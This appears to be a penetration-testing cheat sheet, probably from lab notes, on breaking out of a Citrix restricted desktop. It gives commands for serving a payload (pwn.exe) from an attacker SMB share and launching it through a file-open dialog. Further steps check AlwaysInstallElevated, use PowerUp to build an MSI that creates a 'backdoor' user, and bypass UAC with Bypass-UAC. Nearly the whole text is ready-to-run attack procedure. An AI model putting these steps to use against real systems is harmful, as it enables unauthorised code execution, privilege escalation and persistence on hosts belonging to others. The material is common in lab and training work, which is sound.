# Citrix Breakout

### Ubuntu - Start SMB Server

```bash
smbserver.py -smb2support share $(pwd)
```

---

### Windows - Citrix Breakout (Dialog Box Abuse)

```powershell
# Use any file-open dialog (example: MS Paint)
\\127.0.0.1\c$\users\pmorgan
\\10.13.38.95\share
```

> **Right-click - Open** to execute `pwn.exe` from the SMB share.

---

### Privilege Escalation - PowerUp

```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

---

### Registry Check (AlwaysInstallElevated)

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

### Run as New User

```powershell
runas /user:backdoor cmd
```

---

### UAC Bypass

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

---

### Verify Privileges

```powershell
whoami /all
whoami /priv
```

---

## Workflow Summary

### 1. Initial Access

* Login to Citrix portal and launch `.ica`.
* Note restricted File Explorer.

### 2. Breakout via Dialog Box

* Open MS Paint - **File - Open**.
* Use UNC paths to access:

  * Local drive: `\\127.0.0.1\c$\users\pmorgan`
  * Attacker SMB: `\\<attacker_ip>\share`
* Set file type to **All Files**.

### 3. Execute Payload

* From the dialog box, browse to SMB share.
* Right-click - **Open** - launches `pwn.exe`.
* You get a cmd prompt inside the user session.

### 4. Optional Tools for Breakout

* **Explorer++**, **Q-Dir** - unrestricted file browsers.
* **Simpleregedit**, **SmallRegistryEditor** - unrestricted registry tools.
* Modify shortcut “Target” paths to execute arbitrary binaries.
* Use `.bat` scripts (`cmd` in file - run).

### 5. Privilege Escalation

#### AlwaysInstallElevated

* If enabled in HKCU + HKLM - escalate with MSI.

```powershell
Write-UserAddMSI
```

* Run MSI - create user (e.g., `backdoor`).

```powershell
runas /user:backdoor cmd
```

### 6. UAC Bypass

```powershell
Bypass-UAC -Method UacMethodSysprep
```

### 7. Validate Escalation

```powershell
whoami /all
whoami /priv
```
